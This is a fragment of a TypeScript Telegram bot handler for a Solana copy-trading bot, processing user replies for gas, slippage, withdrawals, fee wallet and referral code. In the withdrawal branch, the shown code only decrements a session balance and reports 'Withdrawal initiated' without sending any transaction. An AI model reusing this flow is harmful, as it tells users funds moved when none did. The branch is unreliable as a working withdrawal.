		if (ctx.message && 'text' in ctx.message && !ctx.message.text.match(/[a-zA-Z]/gi) && ctx.session.user && ctx.session.user.currentCopyTrade && ctx.session.waitingResponse && ctx.session.waitingAction === "ENTER_COPY_TRADE_SELL_GAS_AMOUNT_VALUE" || (ctx.message && 'text' in ctx.message && 'reply_to_message' in ctx.message && !ctx.message.text.match(/[a-zA-Z]/gi) && ctx.message.reply_to_message && ctx.message.reply_to_message.message_id === ctx.session.promptMessageId)) {
			// Store the user's message ID to delete it after a delay
			const userReplyMessageId = ctx.message.message_id;
			const replyValue = ctx.message.text.trim();

			if (replyValue.match(/[a-zA-Z]/gi)) {
				await ctx.reply('Invalid Value');
				setTimeout(() => {
					ctx.deleteMessage(ctx.session.promptMessageId).catch((err) => console.log('Error deleting user message:', err));
				}, defaultTimer);
			} else {
				ctx.session.waitingResponse = false;
				if (ctx.session.user) ctx.session.user.currentCopyTrade.sellGasAmount = parseFloat(replyValue);
				setTimeout(async () => {
					ctx.deleteMessage(ctx.session.currentCopyTradeMessageId).catch((err) => console.log('Error deleting user message:', err));
					newCopyTrade(ctx);
				}, defaultTimer);
			}

			// Optional: Clear session after capturing response
			delete ctx.session.waitingAction;
			delete ctx.session.promptMessageId;
			delete ctx.session.currentCopyTradeMessageId;
		}

		// slippageAmount Listen
		if (ctx.message && 'text' in ctx.message && !ctx.message.text.match(/[a-zA-Z]/gi) && ctx.session.user && ctx.session.user.currentCopyTrade && ctx.session.waitingResponse && ctx.session.waitingAction === "ENTER_COPY_TRADE_SLIPPAGE_AMOUNT_VALUE" || (ctx.message && 'text' in ctx.message && 'reply_to_message' in ctx.message && !ctx.message.text.match(/[a-zA-Z]/gi) && ctx.message.reply_to_message && ctx.message.reply_to_message.message_id === ctx.session.promptMessageId)) {
			// Store the user's message ID to delete it after a delay
			const userReplyMessageId = ctx.message.message_id;
			const replyValue = ctx.message.text.trim();

			if (replyValue.match(/[a-zA-Z]/gi)) {
				await ctx.reply('Invalid Value');
				setTimeout(() => {
					ctx.deleteMessage(ctx.session.promptMessageId).catch((err) => console.log('Error deleting user message:', err));
				}, defaultTimer);
			} else {
				ctx.session.waitingResponse = false;
				if (ctx.session.user) ctx.session.user.currentCopyTrade.slippageAmount = parseFloat(replyValue);
				setTimeout(async () => {
					ctx.deleteMessage(ctx.session.currentCopyTradeMessageId).catch((err) => console.log('Error deleting user message:', err));
					newCopyTrade(ctx);
				}, defaultTimer);
			}

			// Optional: Clear session after capturing response
			delete ctx.session.waitingAction;
			delete ctx.session.promptMessageId;
			delete ctx.session.currentCopyTradeMessageId;
		}

		// Withdrawal Amount Listen
		if (ctx.message && 'text' in ctx.message && !ctx.message.text.match(/[a-zA-Z]/gi) && ctx.session.user && ctx.session.user.balance && ctx.session.waitingResponse && ctx.session.waitingAction === "ENTER_WITHDRAWAL_AMOUNT" || (ctx.message && 'text' in ctx.message && 'reply_to_message' in ctx.message && !ctx.message.text.match(/[a-zA-Z]/gi) && ctx.message.reply_to_message && ctx.message.reply_to_message.message_id === ctx.session.promptMessageId)) {
			// Store the user's message ID to delete it after a delay
			const userWithdrawAmountMessageId = ctx.message.message_id;
			const withdrawAmount = ctx.message.text.trim();
			ctx.session.waitingResponse = false;

			const amountToWithdraw = parseFloat(withdrawAmount);

			if (!ctx.session.user?.balance) {
				await ctx.reply('Unable to get balance');
				setTimeout(() => {
					ctx.deleteMessage(ctx.session.promptMessageId).catch((err) => console.log('Error deleting user message:', err));
					delete ctx.session.promptMessageId;
				}, defaultTimer);
			} else if (ctx.session.user?.balance && amountToWithdraw > ctx.session.user?.balance) {
				await ctx.reply('Not enough SOL to withdraw');
				setTimeout(() => {
					ctx.deleteMessage(ctx.session.promptMessageId).catch((err) => console.log('Error deleting user message:', err));
					delete ctx.session.promptMessageId;
				}, defaultTimer);
			} else {
				ctx.session.withdrawalAmount = amountToWithdraw;
				ctx.session.waitingResponse = true;
				ctx.session.waitingAction = "ENTER_WITHDRAWAL_ADDRESS";
				const promptMessage2 = await ctx.reply('Reply with the destination address');
				ctx.session.promptMessageId = promptMessage2.message_id;
			}
		}

		// Withdrawal Address Listen
		if (ctx.message && 'text' in ctx.message && ctx.message.text.match(/[a-zA-Z]/gi) && ctx.session.user && ctx.session.user.balance && ctx.session.waitingResponse && ctx.session.waitingAction === "ENTER_WITHDRAWAL_ADDRESS" || (ctx.message && 'text' in ctx.message && 'reply_to_message' in ctx.message && ctx.message.text.match(/[a-zA-Z]/gi) && ctx.message.reply_to_message && ctx.message.reply_to_message.message_id === ctx.session.promptMessageId)) {
			if (isValidSolanaAddress(ctx.message.text) && ctx.session.withdrawalAmount) {
				const userWithdrawAddressMessageId = ctx.message.message_id;
				const withdrawAddress = ctx.message.text.trim();
				ctx.session.waitingResponse = false;

				if (withdrawAddress === ctx.session.user?.walletAddress) {
					await ctx.reply('Unable to send to user personal wallet address');
					setTimeout(() => {
						ctx.deleteMessage(userWithdrawAddressMessageId).catch((err) => console.log('Error deleting user message:', err));
						// ctx.deleteMessage(ctx.session.promptMessageId).catch((err) => console.log('Error deleting user message:', err));
					}, defaultTimer);
				} else {
					if (ctx.session.user && ctx.session.user.balance) ctx.session.user.balance = parseFloat((ctx.session.user.balance - ctx.session.withdrawalAmount).toPrecision(7));

					await ctx.reply(`Withdrawal initiated\\.\n\n_View transaction on Explorer_`, {
						...Markup.inlineKeyboard([
							[Markup.button.url('View on Solscan', `${solscanNetworkAddress}${ctx.session.user?.walletAddress}`), Markup.button.callback('Wallet', 'WALLET')],
							[Markup.button.callback('Close', 'CLOSE')],
						]),
						parse_mode: "MarkdownV2"
					});
				}

				// Optional: Clear session after capturing response
				delete ctx.session.waitingAction;
				delete ctx.session.promptMessageId;
				delete ctx.session.withdrawalAmount;
			} else {
				await ctx.reply(`Invalid wallet address`);
			}
		}

		// feeReceiverWallet Listen
		if (ctx.message && 'text' in ctx.message && ctx.message.text.match(/[a-zA-Z]/gi) && ctx.session.user && ctx.session.waitingResponse && ctx.session.waitingAction === "ENTER_FEE_RECEIVER_WALLET" || (ctx.message && 'text' in ctx.message && 'reply_to_message' in ctx.message && ctx.message.text.match(/[a-zA-Z]/gi) && ctx.message.reply_to_message && ctx.message.reply_to_message.message_id === ctx.session.promptMessageId)) {
			// Store the user's message ID to delete it after a delay
			const userReplyMessageId = ctx.message.message_id;
			const replyValue = ctx.message.text.trim();

			if (!isValidSolanaAddress(replyValue)) {
				await ctx.reply('Invalid fee receiver wallet address');
				setTimeout(() => {
					ctx.deleteMessage(ctx.session.promptMessageId).catch((err) => console.log('Error deleting user message:', err));
				}, defaultTimer);
			} else {
				ctx.session.waitingResponse = false;
				if (ctx.session.user) ctx.session.user.receiverWalletAddress = replyValue;
				await ctx.reply('🎉 Fee Receiver Wallet added');
				setTimeout(async () => {
					ctx.deleteMessage(ctx.session.promptMessageId).catch((err) => console.log('Error deleting user message:', err));
					referral(ctx);
				}, defaultTimer);
			}

			// Optional: Clear session after capturing response
			delete ctx.session.waitingAction;
			delete ctx.session.promptMessageId;
		}

		// customReferralCode Listen
		if (ctx.message && 'text' in ctx.message && ctx.message.text.match(/[a-zA-Z]/gi) && ctx.session.user && ctx.session.waitingResponse && ctx.session.waitingAction === "ENTER_CUSTOM_REFERRAL_CODE" || (ctx.message && 'text' in ctx.message && 'reply_to_message' in ctx.message && ctx.message.text.match(/[a-zA-Z]/gi) && ctx.message.reply_to_message && ctx.message.reply_to_message.message_id === ctx.session.promptMessageId)) {
			// Store the user's message ID to delete it after a delay
			const userReplyMessageId = ctx.message.message_id;
			const replyValue = ctx.message.text.trim();

			if (replyValue.length > 20) {
				await ctx.reply('Invalid custom code - Max 20 characters excedded');
				setTimeout(() => {
					ctx.deleteMessage(ctx.session.promptMessageId).catch((err) => console.log('Error deleting user message:', err));
				}, defaultTimer);
			} else {
				ctx.session.waitingResponse = false;
				if (ctx.session.user) ctx.session.user.refLink = botLink + replyValue;
				await ctx.reply('Referral code updated');
				setTimeout(async () => {
					ctx.deleteMessage(ctx.session.promptMessageId).catch((err) => console.log('Error deleting user message:', err));
					referral(ctx);
				}, defaultTimer);
			}

			// Optional: Clear session after capturing response
			delete ctx.session.waitingAction;
			delete ctx.session.promptMessageId;
		}

		return;
	} catch (err) {
		console.log(err)
		await ctx.reply(`_Unable to listen_`, { parse_mode: "MarkdownV2" });
	}
};

export default hears;